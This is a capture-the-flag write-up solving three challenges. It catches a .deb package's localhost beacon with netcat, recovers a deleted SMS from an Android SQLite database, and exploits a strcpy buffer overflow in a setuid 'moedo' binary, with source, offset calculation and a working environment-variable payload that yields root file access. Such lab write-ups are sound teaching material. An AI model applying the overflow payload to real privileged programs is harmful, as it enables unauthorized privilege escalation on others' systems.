## steganography/Deb File \| The old Systems

### The Challenge
```
Can you believe it? people still use linux? after the emerge of Evil E computers, nobody bothered to use linux systems. anyways, we got this file from database gaurds' pc, can you help us?

Attachment : uctfdeb-0.0.1.deb
```
### The Solution
We are given a Debian Binary Package file, so I went straight to install it via `dpkg`.
> Never do this with a random binary from the internet
{: .prompt-danger }

```console
$ sudo dpkg -i uctfdeb-0.0.1.deb
```
and then ran `uctf`:
```console
$ uctf
curl: (7) Failed to connect to 127.0.0.1 port 7327 after 0 ms: Couldn't connect to server
```
The application was trying to connect to 127.0.0.1 on port 7327 most likely to communicate something ( my guess was : it's sending the flag ). So I opened a `netcat` receiver session in a new window and ran `uctf` again:
```console
$ nc -nvlp 7327
listening on [any] 7327 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37996
GET / HTTP/1.1
Host: 127.0.0.1:7327
User-Agent: curl/7.88.1
Accept: */*
flag: UCTF{c4n_p3n6u1n5_5urv1v3_1n_54l7_w473r}
```
### FLAG

`UCTF{c4n_p3n6u1n5_5urv1v3_1n_54l7_w473r}`

## forensics/Deleted Message

### The Challenge

```
Cyber Police have seized a computer containing illegal content, but the data stored is secured with a password. A member of the criminal organization owning the computer was arrested. Police suspect that the password was sent to the criminal via SMS, but the message was deleted right before the arrest. Youâ€™re given a dump of the data partition of the phone (running Android 6.0). Your job as the forensic specialist is to recover the deleted password.

Attachment : data.tar.gz
```
### The Solution
I downloaded the `data.tar.gz` file and extracted it.

Then I went into `data/com.android.messaging/` because that's the place where the deleted SMS might be stored *( "Police suspect that the password was sent to the criminal via SMS" )*. It had the following directories:
```console
$ ls                            
app_webview  cache  code_cache  databases  shared_prefs
```
I thought since message is deleted it might still be in `cache` but sadly it was empty. So naturally I explored the `databases` directory. It had the following files:
```console
$ files *
bugle_db:         SQLite 3.x database, user version 1, last written using SQLite version 3008010, file counter 16, database pages 20, cookie 0x12, schema 4, largest root page 18, UTF-8, version-valid-for 16
bugle_db-journal: data
```
Then I opened the SQL database and viewed all the tables manually:
```console
$ sqlite3 bugle_db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
android_metadata               draft_parts_view             
conversation_image_parts_view  messages                     
conversation_list_view         participants                 
conversation_participants      parts                        
conversations
```
Most of them were empty, but the one in which we are interested is `parts`:
```console
sqlite> .mode column
sqlite> .header on
sqlite> SELECT * FROM parts;
_id  message_id  text                 uri  content_type  width  height  timestamp      conversation_id
---  ----------  -------------------  ---  ------------  -----  ------  -------------  ---------------
1    1           uctf{l057_1n_urm14}       text/plain    -1     -1      1691777451164  1
```
and that's how I got the flag
### FLAG
`uctf{l057_1n_urm14}`

## pwn/moedo

### The Challenge
```
We've created a moe alternative to sudo called moedo.
If you can bypass its moe secuirty you'll be awarded with the flag!

telnet moe.uctf.ir 7002
Username: mashiro
Password: Qh3VRn@23jv43Q
```
**moedo** source code:
```c
##include <stdio.h>
##include <stdlib.h>
##include <string.h>
##include <unistd.h>
##include <grp.h>

##define MOE_ENOUGH 0x30e

int check_moe(int uid)
{
    struct group *moe_group = getgrnam("moe");
    int moeness = 0;

    int ngroups;
    gid_t *groups;

    if (moe_group == NULL)
        return 0;

    ngroups = getgroups(0, NULL);
    groups = malloc(ngroups * sizeof(*groups));
    getgroups(ngroups, groups);
    for (int i = 0; i < ngroups; i++)
    {
        if (groups[i] == moe_group->gr_gid)
        {
            moeness = MOE_ENOUGH;
            break;
        }
    }

    free(groups);
    return moeness;
}

int main(int argc, char *argv[])
{
    uid_t uid = getuid();
    uid_t gid = getgid();
    int moeness = check_moe(uid);

    char *custom_chant = getenv("MOE_CHANT");
    char chant[] = "Moe Moe Kyun!";

    if (argc < 2)
    {
        fputs("Missing command\n", stderr);
        return 1;
    }

    if (custom_chant)
        strcpy(chant, custom_chant);

    printf("UID: %u - GID: %u - Moe: %x\n", uid, gid, moeness);

    if (moeness != MOE_ENOUGH)
    {
        fputs("You're not moe enough!\n", stderr);
        return 1;
    }

    if (setuid(0) != 0)
    {
        perror("setuid() failed");
        return 1;
    }
    if (setgid(0) != 0)
    {
        perror("setgid() failed");
        return 1;
    }

    puts(chant);

    if (execvp(argv[1], &argv[1]) != 0)
    {
        perror("execv() failed");
        return 1;
    }

    return 0;
}
```
### The Solution
We are given a *sandboxed Alpine linux* to connect to via telnet. We also have credentials for a `mashiro` user.

After logging in, it tells us that the flag is located at `/root/flag` and our task simple, **read it**.

Obviously something like `cat /root/flag` doesn't work because we don't have the permission to do so. And `sudo` doesn't exist here, in fact the challenge tells us that they have developed an alternative called `moedo`.

So if we try using `moedo`:

```console
moehost:~$ moedo "cat /root/flag"
UID: 1001 - GID: 1001 - Moe: 0
You're not moe enough!
moehost:~$
```
Hmm...maybe its time to view the source code which they provided:
```c
    if (moeness != MOE_ENOUGH)
    {
        fputs("You're not moe enough!\n", stderr);
        return 1;
    }

    if (setuid(0) != 0)
    {
        perror("setuid() failed");
        return 1;
    }
    if (setgid(0) != 0)
    {
        perror("setgid() failed");
        return 1;
    }

    puts(chant);

    if (execvp(argv[1], &argv[1]) != 0)
    {
        perror("execv() failed");
        return 1;
    }
```
This precisely tells us that our `cat` command will be executed with elevated privileges if we can bypass the `moeness != MOE_ENOUGH` if-statement.

`MOE_ENOUGH` is explicitly defined as `0x30e`. And our `moeness` variable is calculated via the `check_moe()` function. The function itself doesn't seem to have any noticable vulnerabilities ( *at least for me* ). So I looked at the main function has found the bug:
```c
if (custom_chant)
 strcpy(chant, custom_chant)
```
The classic `strcpy` vulnerability which allows us to overflow local variables in the `main()` method. I then generated cyclic pattern using `MsF` for 100 bytes:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
since 100 bytes are sure to overflow the simple `chant[]` buffer:
```c
char chant[] = "Moe Moe Kyun!";
```
Then I set those bytes as `MOE_CHANT` env variable and run the program:
```console
moehost:~$ export MOE_CHANT="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
moehost:~$ moedo "cat /root/flag"
UID: 1648439650 - GID: 1093689921 - Moe: 39614138
You're not moe enough!
Segmentation fault
moehost:~$ 
```
Here we see a seg fault, which is a good sign. But also the content in the `moeness` variable = `39614138`. This can be used to calculate the offset for overflowing this variable:
```console
$ msf-pattern_offset -q 39614138                                                                                    
[*] Exact match at offset 26
$ 
```
To test it, we will set `MOE_CHANT` env variable as `"A" * 26 + "BCDE` and run the program:
```console
moehost:~$ export MOE_CHANT="AAAAAAAAAAAAAAAAAAAAAAAAAABCDE"
moehost:~$ moedo "cat /root/flag"
UID: 1001 - GID: 768 - Moe: 45444342
You're not moe enough!
moehost:~$
```
Great we can successfully control the `moeness` variable. Now let's replace the `BCDE` in env variable as 0x30e ( in little endian format ) and try again:

```console
moehost:~$ export MOE_CHANT="$(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAA\xe\x03')"
moehost:~$ moedo cat /root/flag
UID: 1001 - GID: 1001 - Moe: 30e
AAAAAAAAAAAAAAAAAAAAAAAAAA
uctf{m45h1r0_d1dn7_61v3_up}
moehost:~$
```
BOOM! We got the flag
### FLAG
`uctf{m45h1r0_d1dn7_61v3_up}`
